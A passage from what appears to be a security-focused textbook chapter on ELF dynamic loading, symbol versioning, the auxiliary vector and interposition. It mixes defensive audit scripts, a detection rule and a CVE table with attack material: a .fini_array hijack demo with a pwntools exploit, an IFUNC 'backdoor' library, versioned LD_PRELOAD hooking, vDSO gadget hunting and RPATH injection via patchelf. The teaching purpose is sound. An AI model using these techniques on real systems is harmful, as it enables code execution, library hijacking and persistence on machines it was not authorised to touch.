For example, a binary linked against `GLIBC_2.17` that calls `getaddrinfo@GLIBC_2.2.5` will accept any `libc.so.6` that provides the `GLIBC_2.2.5` version definition. An attacker who places a glibc 2.17 (which contains CVE-2015-7547, a buffer overflow in `getaddrinfo`) in a directory that precedes the system library in the search path can force the vulnerable implementation to be loaded. The version check passes — `GLIBC_2.2.5` exists in the old library — and the binary runs with a known-vulnerable function.

The defense is library integrity verification (cryptographic hashes in package managers, dm-verity for system partitions, IMA-appraisal) and minimizing writable directories in the library search path.

### 9.6 Versioned `LD_PRELOAD` interposition

A naive `LD_PRELOAD` library that exports `memcpy` without a version symbol will only interpose unversioned `memcpy` references. Most modern binaries reference `memcpy@@GLIBC_2.14` (the version that changed `memcpy`'s copy direction guarantees), so the unversioned preload is silently ignored for those references.

To interpose a versioned symbol, the preload library must itself declare the same version. This is done via a linker version script:

```c
/* preload_memcpy.c — LD_PRELOAD that actually interposes versioned memcpy.
 * Build: gcc -shared -fPIC -o preload_memcpy.so preload_memcpy.c \
 *        -Wl,--version-script=memcpy.map
 *
 * memcpy.map contents:
 *   GLIBC_2.14 {
 *     global: memcpy;
 *   };
 */
#include <stddef.h>
#include <string.h>

void *memcpy(void *dst, const void *src, size_t n) {
    /* Attacker/debugger replacement — this version is now called
     * for memcpy@GLIBC_2.14 references. */
    /* ... custom logic ... */
    /* Fall through to byte-by-byte copy or call __memcpy_chk */
    char *d = dst;
    const char *s = src;
    while (n--) *d++ = *s++;
    return dst;
}
```

This technique is relevant both offensively (an attacker crafting a version-matched preload to hook hardened functions) and defensively (debugging tools that need to intercept specific versioned symbols). Detection: any `LD_PRELOAD`'d DSO that defines `.gnu.version_d` entries matching system library versions is suspicious and should be flagged.

### 9.7 Symbol version binding dump for forensic analysis

The following script dumps all versioned symbol bindings for a running process, showing which DSO provides each versioned symbol and which version was resolved:

```bash
#!/bin/bash
# version_bindings.sh — dump versioned symbol resolutions for a process.
# Usage: version_bindings.sh <PID>

PID="${1:?Usage: $0 <PID>}"

echo "=== Versioned symbol bindings for PID $PID ==="

# For each loaded DSO, dump version definitions and requirements
mapfile -t dsos < <(
    awk '$6 ~ /\.so/ && !seen[$6]++ {print $6}' "/proc/$PID/maps" 2>/dev/null
)

for dso in "${dsos[@]}"; do
    [ -f "$dso" ] || continue

    echo ""
    echo "--- $dso ---"

    # Version definitions (what this DSO provides)
    verdefs=$(readelf -V "$dso" 2>/dev/null | grep -A2 'Version definition')
    if [ -n "$verdefs" ]; then
        echo "  Provides:"
        readelf -V "$dso" 2>/dev/null | awk '/Version definition/,/^$/' | \
            grep 'Name:' | sed 's/^/    /'
    fi

    # Version requirements (what this DSO needs)
    verneeds=$(readelf -V "$dso" 2>/dev/null | grep -A2 'Version needs')
    if [ -n "$verneeds" ]; then
        echo "  Requires:"
        readelf -V "$dso" 2>/dev/null | awk '/Version needs/,/^$/' | \
            grep -E '(File:|Name:)' | sed 's/^/    /'
    fi
done

# Show any LD_PRELOAD-injected DSOs that define version symbols
echo ""
echo "=== LD_PRELOAD DSO version analysis ==="
preloads=$(tr '\0' '\n' < "/proc/$PID/environ" 2>/dev/null | grep '^LD_PRELOAD=' | cut -d= -f2)
if [ -n "$preloads" ]; then
    for p in $preloads; do
        echo "PRELOADED: $p"
        readelf -V "$p" 2>/dev/null | awk '/Version definition/,/^$/' | \
            grep 'Name:' | sed 's/^/  DEFINES: /'
    done
else
    echo "(no LD_PRELOAD detected)"
fi
```

---

## 10. The auxiliary vector — deeper treatment

Chapter 1A §5 introduced the auxiliary vector. Several entries merit expanded treatment:

### 10.1 `AT_SECURE` (23)

Set to 1 by the kernel when the process gains privileges through the `execve` transition — specifically, when the new program's effective UID/GID differs from the real UID/GID, or when the binary has file capabilities. When `AT_SECURE == 1`, `ld.so` enters "secure mode" and:

- Ignores `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `LD_DEBUG`, and other environment variables that would allow the (potentially unprivileged) user who set them to influence the privileged program.
- Ignores `DT_RPATH` if `DT_RUNPATH` is also present.
- Restricts `$ORIGIN` expansion.

`AT_SECURE` is the mechanism by which setuid programs resist library-injection attacks from the invoking user. Its correctness is foundational: if `AT_SECURE` is not set when it should be (a kernel bug), the entire setuid privilege-separation model fails. Historically, `AT_SECURE` handling has been a source of real vulnerabilities — CVE-2010-3856 (glibc's `LD_AUDIT` was not properly restricted under `AT_SECURE`), CVE-2017-1000366 (stack-clash attack via `LD_LIBRARY_PATH` interaction with stack allocation).

### 10.2 `AT_RANDOM` (25)

A pointer to 16 bytes of kernel-generated random data, placed on the stack during `execve`. Used by:

- glibc to initialize `__stack_chk_guard` (the stack canary). The canary is derived from `AT_RANDOM` bytes with a NUL byte inserted at position 0 (to prevent string functions from leaking the canary).
- glibc to initialize `__pointer_chk_guard` (the pointer-mangling cookie used by `setjmp`/`longjmp` and `atexit`).
- Some allocators (tcmalloc) for ASLR-like internal randomization.

The quality of the process's security primitives depends on this seed. It is generated by the kernel's CSPRNG (`get_random_bytes`), so it is cryptographic quality. An information leak that reveals the `AT_RANDOM` bytes (e.g., a format-string bug that reads from the stack region where `AT_RANDOM` was placed) compromises the stack canary and the pointer-mangling cookie simultaneously.

### 10.3 `AT_SYSINFO_EHDR` (33)

The virtual address of the vDSO (virtual Dynamic Shared Object) — a kernel-provided shared object mapped into every process's address space. The vDSO exports fast-path implementations of system calls that can be serviced without a full kernel transition: `gettimeofday`, `clock_gettime`, `time`, `getcpu` on x86_64; analogous functions on AArch64. The vDSO reads from the `vvar` pages — kernel-maintained read-only pages mapped into userspace that contain the current time, clock data, and other frequently-queried values.

The vDSO's mapping address is randomized by ASLR. Leaking `AT_SYSINFO_EHDR` reveals the vDSO's location, which can be useful in exploitation if the vDSO contains useful gadgets (it often does, as it is a normal `.text` region with `ret` instructions).

The older `vsyscall` page (mapped at the fixed address `0xFFFFFFFFFF600000` on x86_64) is the predecessor of the vDSO. It provided the same fast-path syscalls but at a fixed address — a ROP-gadget goldmine. Modern kernels emulate `vsyscall` via `CONFIG_X86_VSYSCALL_EMULATE` (trapping and emulating the three known call addresses rather than mapping executable code) or `CONFIG_X86_VSYSCALL_NONE` (disabling it entirely). The `vsyscall=emulate` or `vsyscall=none` kernel parameter controls this. On a hardened system, `vsyscall=none` should be the setting.

### 10.4 `AT_HWCAP` (16) and `AT_HWCAP2` (26)

Bitmasks of CPU hardware features, as detected by the kernel. Used by:

- glibc IFUNC resolvers (§2) on AArch64 to select implementations without executing `mrs` in userspace.
- Dynamic linker `hwcap` subdirectory search: the loader can search for libraries in subdirectories named after hwcap features (e.g., `/lib/x86_64-linux-gnu/haswell/`), preferring hardware-optimized builds.
- IFUNC resolvers on x86_64 typically use `cpuid` directly, but `AT_HWCAP` is available if preferred.

### 10.5 `AT_PHDR` (3), `AT_PHENT` (4), `AT_PHNUM` (5), `AT_ENTRY` (9), `AT_BASE` (7)

These are the handoff parameters that allow the dynamic linker to find the program's program headers, entry point, and its own load base without hardcoding addresses. `AT_BASE` is the dynamic linker's load address (needed for its own self-relocation); `AT_ENTRY` is the program's relocated entry point (which the linker jumps to after finishing setup); `AT_PHDR`/`AT_PHENT`/`AT_PHNUM` point the linker at the program's program header table so it can find `PT_DYNAMIC`.

### 10.6 `AT_RANDOM` leak exploitation

The 16 bytes at the address pointed to by `AT_RANDOM` are the entropy source for the process's primary security primitives. An information leak that reveals these bytes — a format-string vulnerability reading from the initial stack region, an out-of-bounds read from an array on the main thread's stack, or a `/proc/PID/mem` read by a same-UID attacker — immediately compromises the stack canary and pointer guard.

The canary is derived from the first 8 bytes of `AT_RANDOM` with byte 0 set to NUL (0x00). The pointer guard is the next 8 bytes. With both values, the attacker can forge stack frames that pass canary checks and can decode/re-encode `setjmp`/`longjmp` buffers (which use the pointer guard via `PTR_MANGLE`/`PTR_DEMANGLE`), enabling control-flow hijack through `longjmp` or `atexit` handler chains.

Dumping the auxiliary vector from outside the process (for reconnaissance or post-exploitation analysis) is straightforward:

```bash
# Dump the auxiliary vector of a target process
# Requires same UID or CAP_SYS_PTRACE
LD_SHOW_AUXV=1 /bin/true  # for the current process

# For a running process, parse /proc/PID/auxv:
python3 -c "
import struct, sys
pid = sys.argv[1]
with open(f'/proc/{pid}/auxv', 'rb') as f:
    data = f.read()
names = {
    3: 'AT_PHDR', 4: 'AT_PHENT', 5: 'AT_PHNUM', 6: 'AT_PAGESZ',
    7: 'AT_BASE', 9: 'AT_ENTRY', 15: 'AT_PLATFORM', 16: 'AT_HWCAP',
    23: 'AT_SECURE', 25: 'AT_RANDOM', 26: 'AT_HWCAP2',
    31: 'AT_EXECFN', 33: 'AT_SYSINFO_EHDR',
}
for i in range(0, len(data), 16):
    tag, val = struct.unpack('<QQ', data[i:i+16])
    if tag == 0: break
    name = names.get(tag, f'AT_{tag}')
    print(f'{name:20s} = {val:#018x}')
" "$1"
```

The `AT_RANDOM` entry's value is the *address* of the 16 random bytes, not the bytes themselves. An attacker who reads `AT_RANDOM` from `/proc/PID/auxv` learns the address, but must then read from that address (via `/proc/PID/mem` or another primitive) to get the actual random bytes.

### 10.7 vDSO gadget catalog

The vDSO is a kernel-mapped shared object present in every process. Its address is randomized by ASLR but can be leaked via `AT_SYSINFO_EHDR`, via `/proc/PID/maps`, or via any pointer leak that reveals a vDSO-range address. Because the vDSO is mapped `R-X` (readable, executable), its `.text` content is available as ROP gadgets.

Typical useful gadgets found in the x86_64 vDSO include `syscall; ret` sequences (for executing arbitrary syscalls in a ROP chain), `pop rdi; ret` fragments (from function prologues), and various register-setup sequences. The gadget catalog is small (the vDSO is typically 1–2 pages) but contains high-value primitives:

```bash
# Extract vDSO from a process and scan for gadgets
# Method: dump from /proc/PID/maps region or use vdso_dump utility
cat /proc/self/maps | grep vdso
# Example output: 7ffd12ffe000-7ffd12fff000 r-xp 00000000 00:00 0 [vdso]

# With ROPgadget or ropper:
# ROPgadget --binary vdso.so --only "pop|ret|syscall"
```

The older **vsyscall page** (fixed at `0xFFFFFFFFFF600000`) is a more dangerous gadget source because it is not ASLR-randomized. On kernels with `CONFIG_X86_VSYSCALL_EMULATE`, the three known entry points (`gettimeofday`, `time`, `getcpu`) are emulated via trapping rather than executed natively, which makes them useless as gadgets (the `INT3`-based trap changes the execution context). On `CONFIG_X86_VSYSCALL_NONE`, the page is unmapped entirely. Hardened systems should use `vsyscall=none` on the kernel command line.

### 10.8 `AT_SECURE` bypass: historical CVEs

`AT_SECURE` is the kernel's signal to the dynamic linker that the process is running with elevated privileges (setuid/setgid transition or file capabilities). When `AT_SECURE == 1`, `ld.so` enters secure mode and strips dangerous environment variables. Historical bypasses fall into two categories.

The first category is **incomplete variable stripping**: the dynamic linker failed to scrub a specific environment variable that could influence library loading or code execution. CVE-2010-3856 is the canonical example: glibc's `ld.so` did not strip `LD_AUDIT` when `AT_SECURE == 1`, allowing an unprivileged user to cause a setuid binary to load an arbitrary auditing DSO (specified by `LD_AUDIT`), which executes `la_objopen` callbacks — arbitrary code — as the effective UID. The fix was to add `LD_AUDIT` to the scrub list.

The second category is **stack-layout manipulation** that interferes with `AT_SECURE` processing. CVE-2017-1000366 (Stack Clash) demonstrated that by manipulating the stack and heap sizes of a setuid binary's execution environment (via `RLIMIT_STACK` and specially crafted environment strings), an attacker could cause the stack to grow into the heap or vice versa, corrupting the dynamic linker's internal state before `AT_SECURE` processing completed. The attack bypassed library search path restrictions by corrupting `ld.so`'s internal variables after the `AT_SECURE` scrub but before the variables were used.

The lesson is that `AT_SECURE` is a correctness-critical code path that runs at the intersection of kernel, dynamic linker, and environment-string processing — one of the highest-consequence attack surfaces in the Linux userspace.

---

## 11. Position-independent executables and `__x86.get_pc_thunk`

### 11.1 PIE on x86_64

On x86_64, position independence is natural: the instruction set provides RIP-relative addressing (`lea rax, [rip + offset]`), so code can reference data at known offsets from the current instruction without knowing the absolute address. A PIE is compiled with `-fpie` (or the modern default), linked with `-pie`, and the linker emits `e_type = ET_DYN` with `DF_1_PIE` in `DT_FLAGS_1`. The kernel loads it at an ASLR-randomized base and the `R_X86_64_RELATIVE` relocations fix up all absolute pointers.

### 11.2 PIE on i386: `__x86.get_pc_thunk`

i386 lacks RIP-relative addressing. Position-independent code on 32-bit x86 must discover its own address at runtime. The conventional trick:

```asm
__x86.get_pc_thunk.bx:
    mov    (%esp), %ebx   ; get the return address (= the call site's IP)
    ret

; Call site:
    call   __x86.get_pc_thunk.bx
    add    $_GLOBAL_OFFSET_TABLE_, %ebx   ; ebx now points at the GOT
    ; subsequent data references: mov offset(%ebx), %eax
```

The `call` instruction pushes the next instruction's address onto the stack; the thunk moves it to a register. The caller then adds the known offset to the GOT. Variants exist for each register (`__x86.get_pc_thunk.ax`, `.cx`, `.dx`, `.bx`, `.si`, `.di`).

This pattern is ubiquitous in 32-bit PIE and PIC code. It is also a stable signature for PIC-aware code on i386. A 32-bit binary that neither uses `__x86.get_pc_thunk` nor has absolute addresses (no relocations at all) is unusual and worth investigating.

Modern 64-bit environments use `__x86.get_pc_thunk` only in 32-bit compatibility mode; new 64-bit code never needs it.

---

## 12. Dynamic symbol interposition

### 12.1 The interposition model

ELF's default symbol-resolution rules enable interposition: a symbol defined in an earlier-loaded object overrides the same-named symbol in a later-loaded one. The resolution order (executable → `LD_PRELOAD` → `DT_NEEDED` libraries in BFS order) means:

- The executable's definitions take priority over everything.
- An `LD_PRELOAD`'d library's definitions take priority over all `DT_NEEDED` libraries.
- A library loaded earlier in `DT_NEEDED` order takes priority over one loaded later.

This is the mechanism behind `LD_PRELOAD`-based hooking (for debugging, profiling, and attack), `malloc` replacement (tcmalloc, jemalloc), and POSIX threading (`libpthread`'s `fork` interposing libc's `fork`).

### 12.2 Interposition constraints

Several mechanisms restrict interposition:

**`STV_HIDDEN`** — the symbol is not exported to the dynamic symbol table; it is invisible to other objects and cannot be interposed.

**`STV_PROTECTED`** — the symbol is exported (visible to other objects for resolution) but the defining object's own references are bound directly to its own definition, bypassing the global scope. This means an `LD_PRELOAD` defining the same symbol will be used by other DSOs but not by the defining DSO's own internal calls.

**`DF_SYMBOLIC` / `-Bsymbolic`** — all symbols in the DSO are treated as if they were protected: the DSO's own references prefer its own definitions. Broader than `STV_PROTECTED` (which is per-symbol).

**`DF_1_INTERPOSE`** — the opposite: forces the DSO's symbols to interpose over everything, including earlier-loaded objects. Rarely used; `libthread_db` and a few profiling tools use it.

**`AT_SECURE`** — disables `LD_PRELOAD` entirely for setuid/setgid programs.

### 12.3 Security implications

Interposition is both a powerful defensive tool (fault injection, API wrapping, malloc hardening) and a persistent offensive tool (hook libc functions via `LD_PRELOAD`). The defense posture around interposition:

For setuid programs, `AT_SECURE` handles this. For non-setuid programs, if an attacker can modify the environment or the filesystem, `LD_PRELOAD` gives code execution — this is why container runtimes scrub `LD_*` environment variables and why filesystem isolation matters. Libraries that want intra-library calls to be non-interposable should use `-fvisibility=hidden` (default-hide all symbols, explicit-export the public API) or `-Bsymbolic-functions`, which prevents preload hooks from reaching internal code paths.

Detection: enumerating loaded objects and checking for unexpected DSOs in the `link_map` chain is a straightforward runtime check. The `link_map` is accessible from `r_debug` (reachable from `DT_DEBUG` in the executable's `.dynamic`). Any DSO not accounted for by the expected dependency tree is a candidate for investigation.

---

## 13. The complete ELF load sequence (revised)

Combining Chapters 1A and 1B, the full sequence with all components:

1. **`execve`** → kernel validates ELF, mmaps `PT_LOAD` segments, randomizes base for PIE, reads `PT_INTERP`, mmaps `ld.so`, builds auxv on stack, transfers to `ld.so`'s `_start`.

2. **Self-relocation**: `ld.so` processes its own `R_X86_64_RELATIVE` relocations using PC-relative bootstrap.

3. **Program header scan**: locates program's `PT_DYNAMIC` via `AT_PHDR`. Reads `.dynamic` tags.

4. **Dependency walk**: BFS through `DT_NEEDED`, opens each DSO via search path rules (subject to `AT_SECURE`), mmaps each DSO's `PT_LOAD` segments at random bases.

5. **Relocation phase** (per object, in dependency-bottom-up order):
   - `R_X86_64_RELATIVE` — base-fixup, no symbol lookup.
   - `R_X86_64_GLOB_DAT` — resolve and write GOT entries for global variables.
   - `R_X86_64_COPY` — copy variables from DSO to executable's BSS (non-PIE only).
   - `R_X86_64_JUMP_SLOT` — if `DF_BIND_NOW`: resolve now; else: defer (lazy binding).
   - `R_X86_64_IRELATIVE` — call IFUNC resolver, write result.
   - TLS relocations (`DTPMOD64`, `DTPOFF64`, `TPOFF64`, `GOTTPOFF`) — populate TLS-related GOT entries.

6. **RELRO application**: `_dl_protect_relro` → `mprotect(PT_GNU_RELRO range, PROT_READ)`.

7. **`DT_DEBUG` setup**: write `r_debug` pointer into `.dynamic`.

8. **CET/BTI evaluation**: check all loaded objects' `PT_GNU_PROPERTY` notes; enable IBT/SHSTK or BTI/PAC if all objects declare support.

9. **Constructor phase** (per object, in dependency-bottom-up order):
   - `DT_PREINIT_ARRAY` — executable only, runs first.
   - `DT_INIT` — legacy single-function constructor.
   - `DT_INIT_ARRAY` — modern constructor array, entries called in order.

10. **Transfer to program**: jump to `e_entry` (relocated) → `_start` → `__libc_start_main` → `main`.

11. **Runtime lazy binding** (if not `BIND_NOW`): each first call to an imported function triggers PLT → `_dl_runtime_resolve` → `_dl_fixup` → GOT patched → function called.

12. **Process exit**: `exit()` → `atexit` handlers → per-DSO `DT_FINI_ARRAY` (reverse array order) → `DT_FINI` → in reverse dependency order.

---

## 14. Runtime security segment verification

Static analysis tools like `checksec` (covered in Chapter 1A §18) examine a single binary file on disk. The runtime audit perspective is different: a process loads dozens of DSOs, and its effective security posture is determined by the *weakest* one. The following Python script uses `/proc/PID/maps` and `readelf` to audit every loaded ELF object in a running process for the full set of hardening properties:

```python
#!/usr/bin/env python3
"""dso_security_audit.py — runtime hardening audit for all loaded DSOs.

Usage: python3 dso_security_audit.py <PID>

Checks: RELRO (partial/full/none), NX stack, PIE, FORTIFY_SOURCE,
        stack canary, CET IBT/SHSTK (x86_64) or BTI/PAC (aarch64).

Requires: readelf in PATH, read access to /proc/<PID>/maps.
"""
import subprocess
import sys
import re
from pathlib import Path

def get_loaded_dsos(pid):
    maps = Path(f"/proc/{pid}/maps").read_text()
    dsos = set()
    for line in maps.splitlines():
        parts = line.split()
        if len(parts) >= 6 and ('/' in parts[5] or parts[5].startswith('[')):
            path = parts[5]
            if path.startswith('/') and Path(path).exists():
                dsos.add(path)
    return sorted(dsos)

def readelf_output(path, flags):
    try:
        r = subprocess.run(
            ["readelf"] + flags + [path],
            capture_output=True, text=True, timeout=10
        )
        return r.stdout
    except Exception:
        return ""

def audit_dso(path):
    result = {"path": path, "issues": []}

    # RELRO check
    phdrs = readelf_output(path, ["-l", "--wide"])
    dynamic = readelf_output(path, ["-d", "--wide"])

    has_relro = "GNU_RELRO" in phdrs
    has_bind_now = "BIND_NOW" in dynamic or "(NOW)" in dynamic

    if not has_relro:
        result["relro"] = "NONE"
        result["issues"].append("CRITICAL: No RELRO")
    elif has_bind_now:
        result["relro"] = "FULL"
    else:
        result["relro"] = "PARTIAL"
        result["issues"].append("WARN: Partial RELRO (GOT.PLT writable)")

    # NX stack
    stack_line = [l for l in phdrs.splitlines() if "GNU_STACK" in l]
    if not stack_line:
        result["issues"].append("WARN: No PT_GNU_STACK (stack may be executable)")
    elif "RWE" in stack_line[0]:
        result["issues"].append("CRITICAL: Executable stack (RWE)")

    # PIE check (for executables)
    headers = readelf_output(path, ["-h", "--wide"])
    if "DYN" in headers:
        if "DF_1_PIE" in dynamic or "(PIE)" in dynamic:
            pass  # PIE enabled
        # Could be a DSO — not an issue
    elif "EXEC" in headers:
        result["issues"].append("WARN: Non-PIE executable (fixed addresses)")

    # FORTIFY check: presence of _chk variants in imports
    syms = readelf_output(path, ["-s", "--wide"])
    has_chk = bool(re.search(r'__\w+_chk@', syms))
    has_unfortified = bool(re.search(r' (memcpy|strcpy|sprintf|gets)@', syms))
    if has_unfortified and not has_chk:
        result["issues"].append("INFO: No FORTIFY_SOURCE detected")

    # CET/BTI/PAC
    notes = readelf_output(path, ["-n", "--wide"])
    if "x86 feature: IBT" not in notes and "IBT" not in notes:
        result["issues"].append("INFO: No CET-IBT property")
    if "x86 feature: SHSTK" not in notes and "SHSTK" not in notes:
        result["issues"].append("INFO: No CET-SHSTK property")

    return result

def main():
    pid = sys.argv[1]
    dsos = get_loaded_dsos(pid)
    print(f"Auditing {len(dsos)} loaded ELF objects for PID {pid}\n")

    critical = 0
    for path in dsos:
        r = audit_dso(path)
        if r["issues"]:
            print(f"  {path}")
            for issue in r["issues"]:
                print(f"    {issue}")
                if issue.startswith("CRITICAL"):
                    critical += 1
            print()

    print(f"=== {critical} CRITICAL issues across {len(dsos)} DSOs ===")
    if critical > 0:
        print("Process security posture is degraded by weak DSOs.")
    sys.exit(1 if critical > 0 else 0)

if __name__ == "__main__":
    main()
```

The key insight this script operationalizes is that `checksec` on the main binary is insufficient. A fully hardened executable loading a single DSO with `DF_TEXTREL`, no RELRO, or missing CET properties degrades the entire process. The CET weakest-link audit in §5.7 focuses on hardware CFI specifically; this script covers the broader hardening surface.

For detection engineering, the following Sigma rule triggers on execution of binaries with weak ELF security properties. It assumes an enrichment pipeline that extracts ELF metadata at exec time (via BPF, audit, or a custom LSMS hook):

```yaml
title: Execution of ELF Binary with Weak Security Properties
id: a3f1d2e4-7b8c-4f5a-9e0d-1c2b3a4f5e6d
status: experimental
date: 2026-05-08
description: >
    Detects execution of ELF binaries missing critical hardening: no RELRO,
    executable stack, no PIE, or text relocations.  Requires ELF metadata
    enrichment at process-exec time.
logsource:
    category: process_creation
    product: linux
detection:
    selection_no_relro:
        ElfRelro: "none"
    selection_exec_stack:
        ElfStackFlags|contains: "E"
    selection_textrel:
        ElfFlags|contains: "TEXTREL"
    selection_no_pie:
        ElfType: "EXEC"
    condition: selection_no_relro or selection_exec_stack or selection_textrel or selection_no_pie
falsepositives:
    - Legacy 32-bit binaries
    - Statically linked executables
    - Embedded/firmware tools
level: medium
tags:
    - attack.defense_evasion
    - attack.t1027
```

---

## 15. CVE reference table — TLS, loader, and advanced ELF feature vulnerabilities

The following table maps CVEs specific to the advanced ELF features covered in this chapter to their attack type, affected component, and detection approach. For GOT/PLT and general dynamic-linker CVEs, see Chapter 1A §20.

| CVE | Component | Attack type | Description | Detection |
|-----|-----------|-------------|-------------|-----------|
| CVE-2023-4911 | glibc `ld.so` / `__tunables_init` | Stack buffer overflow → TLS/TCB corruption | `GLIBC_TUNABLES` parsing overflow in dynamic linker. Local privilege escalation via any SUID binary. Affects glibc 2.34–2.38. | Check glibc version. Monitor for oversized `GLIBC_TUNABLES` in `/proc/PID/environ`. |
| CVE-2024-2961 | glibc `iconv` / `ld.so` | Buffer overflow in character conversion | Overflow in `iconv()` triggered during locale processing in the loader. Reachable through crafted `LC_*` environment variables. | Patch glibc. Monitor for unusual `LC_CTYPE`/`LC_ALL` values at exec time. |
| CVE-2017-1000366 | glibc `ld.so` / stack-heap | Stack Clash — stack-heap collision | Crafted `LD_LIBRARY_PATH` or environment causes stack to collide with heap during `ld.so` processing. Bypasses `AT_SECURE` on some paths. | Kernel stack guard gap (`/proc/sys/vm/mmap_min_addr`), glibc patch, `RLIMIT_STACK` limits. |
| CVE-2015-7547 | glibc `getaddrinfo` | Stack buffer overflow | `getaddrinfo()` allocates an insufficiently sized buffer for DNS responses > 2048 bytes. Exploitable via crafted DNS server response. | Patch glibc ≥ 2.23. Network-level: detect oversized DNS response payloads. |
| CVE-2010-3856 | glibc `ld.so` / `LD_AUDIT` | `AT_SECURE` bypass | `LD_AUDIT` not stripped in secure mode. Attacker loads arbitrary auditing DSO in SUID context. | Patch glibc. Verify `LD_AUDIT` is stripped under `AT_SECURE`. |
| CVE-2009-3736 | libtool `libltdl` | `.eh_frame` use-after-free | Confusion between `dlopen`'d module's unwind data and host process CIEs. Personality routine dispatch follows dangling pointer. | Update libltdl. Avoid `lt_dlopen` in security-sensitive paths. |
| CVE-2021-3326 | glibc `iconv` | Assertion failure / DoS | Crafted character conversion triggers assertion in `iconv`, reachable through locale processing at loader init. | Patch glibc. |
| CVE-2023-6246 | glibc `__vsyslog_internal` | Heap buffer overflow | Heap overflow in syslog functions, reachable from `ld.so` logging paths. Local privilege escalation. | Patch glibc ≥ 2.39. |
| CVE-2023-6779 | glibc `__vsyslog_internal` | Off-by-one heap overflow | Related to CVE-2023-6246; additional overflow in syslog buffer handling. | Patch glibc ≥ 2.39. |

---

## 16. ELF exploitation techniques — advanced features

This section covers exploitation primitives specific to the advanced ELF features introduced in this chapter. For the foundational GOT overwrite and format-string-to-GOT pivot, see Chapter 1A §13. The techniques here target constructors/destructors, IFUNC resolvers, library search-path injection, segment manipulation, and preload-based persistence.

### 16.1 `.ctors`/`.dtors` and `.init_array`/`.fini_array` abuse

The `.init_array` and `.fini_array` sections (§3) contain arrays of function pointers executed by the runtime before `main` and after `main` returns (or `exit()` is called). In older ELF binaries, the legacy `.ctors` and `.dtors` sections serve the same purpose. Under partial RELRO, these sections reside in writable memory after relocation completes. An attacker with an arbitrary-write primitive can overwrite an entry, and the payload executes automatically at the next constructor pass (for `.init_array`, only exploitable via `dlopen` of a crafted library) or at program exit (for `.fini_array`).

The `.fini_array` attack is more practical: many exploitation scenarios gain a single write but cannot redirect control flow immediately. Overwriting `.fini_array[0]` with a controlled address achieves deferred code execution when `__libc_csu_fini` walks the array at `exit()`.

```c
/* fini_array_hijack.c — demonstrate .fini_array overwrite
 * Build: gcc -no-pie -z norelro -o fini_vuln fini_array_hijack.c
 * Educational/authorized-research only.
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

/* This function simulates the attacker's target */
void win(void) {
    puts("[!] .fini_array hijack succeeded — arbitrary code execution");
    exit(0);
}

/* Simulated arbitrary-write primitive */
void vuln(void) {
    uintptr_t addr, value;
    printf("write-what-where: addr value\n");
    scanf("%lx %lx", &addr, &value);
    *(uintptr_t *)addr = value;       /* arbitrary write */
}

int main(void) {
    printf(".fini_array @ %p\n", (void *)0x0);  /* use readelf to find */
    printf("win()       @ %p\n", (void *)win);
    vuln();
    printf("Exiting normally — .fini_array runs now\n");
    return 0;  /* __libc_csu_fini traverses .fini_array */
}
```

Locating the target:

```bash
# Find .fini_array address and size
$ readelf -S fini_vuln | grep fini_array
  [20] .fini_array       FINI_ARRAY      0000000000403e00  00003e00
       0000000000000008  0000000000000008  WA       0     0     8

# Verify the section is writable (W flag present)
# Overwrite 0x403e00 with address of win()
```

The pwntools equivalent for automated exploitation:

```python
from pwn import *

elf = ELF("./fini_vuln")
p = process("./fini_vuln")

fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
win_addr = elf.symbols['win']

p.sendline(f"{fini_array:x} {win_addr:x}".encode())
p.interactive()
```

**Mitigation.** Full RELRO (`-z relro -z now`) relocates `.fini_array` into the read-only RELRO segment. After the dynamic linker finishes, `mprotect` makes the page read-only, and the write primitive triggers `SIGSEGV` instead of a hijack.

### 16.2 IFUNC resolver exploitation

IFUNC resolvers (§2) are ordinary functions called by the dynamic linker at load time to select an implementation. The resolver address is stored in the GOT via `R_X86_64_IRELATIVE` relocations. If an attacker can overwrite the IRELATIVE GOT slot before the resolver executes, or if they can compromise the resolver function itself in a malicious shared library, they gain code execution during the earliest phase of process initialization — before `main`, before `.init_array`, and often before security monitors attach.

The attack surface is amplified in binaries that use glibc's IFUNC mechanism for `memcpy`, `strcmp`, and other hot-path functions. Every such function's resolution involves calling a resolver at load time, providing multiple hijack points.

CVE-2017-1000366 (Stack Clash) and CVE-2023-4911 (Looney Tunables) both intersect with the IFUNC resolution window: the dynamic linker executes resolvers with full process privileges, and any corruption of the loader's internal state during this phase can redirect resolver dispatch.

A crafted shared library can register an IFUNC resolver that performs arbitrary actions:

```c
/* malicious_ifunc.c — IFUNC resolver as a load-time backdoor
 * Build: gcc -shared -fPIC -o libifunc_evil.so malicious_ifunc.c
 * Load:  LD_PRELOAD=./libifunc_evil.so /bin/ls
 * Educational/authorized-research only.
 */
#include <stdio.h>
#include <unistd.h>

/* The real implementation — does nothing interesting */
static int real_impl(int x) { return x + 1; }

/* The resolver — runs at load time with full privileges */
static void * resolve_hook(void) {
    /* Arbitrary code execution before main() */
    write(2, "[!] IFUNC resolver executing\n", 29);
    /* Could: reverse shell, modify GOT entries, patch .text */
    return (void *)real_impl;
}

/* Declare the IFUNC symbol */
int hooked_func(int x) __attribute__((ifunc("resolve_hook")));
```

Detection is covered in §17. The key forensic indicator is `R_X86_64_IRELATIVE` relocations pointing outside the binary's own `.text` segment or into writable memory.

### 16.3 `DT_RPATH` and `DT_RUNPATH` injection for library hijacking

The dynamic linker's library search order is: `DT_RPATH` (deprecated but still honored), `LD_LIBRARY_PATH`, `DT_RUNPATH`, `/etc/ld.so.cache`, default paths (`/lib`, `/usr/lib`). An attacker who can modify a binary's `.dynamic` section or who controls a directory in `DT_RPATH`/`DT_RUNPATH` can force the loader to load a malicious library instead of the legitimate one.

`DT_RPATH` is particularly dangerous because it is searched before `LD_LIBRARY_PATH`, meaning it takes precedence even when the user has set a custom library path. Furthermore, `DT_RPATH` is not subject to `AT_SECURE` stripping (unlike `LD_LIBRARY_PATH` and `LD_PRELOAD`), so a SUID binary with a `DT_RPATH` pointing to an attacker-controlled directory is exploitable.

```bash
# Inspect RPATH/RUNPATH on a binary
$ readelf -d /usr/bin/target | grep -E 'RPATH|RUNPATH'
 0x000000000000000f (RPATH)    Library rpath: [/opt/app/lib:$ORIGIN/../lib]

# patchelf can inject or modify RPATH on a writable binary
$ patchelf --set-rpath '/tmp/evil:$ORIGIN/../lib' ./target_binary

# Verify the change
$ readelf -d ./target_binary | grep RPATH
 0x000000000000000f (RPATH)    Library rpath: [/tmp/evil:$ORIGIN/../lib]

# Now plant a malicious library
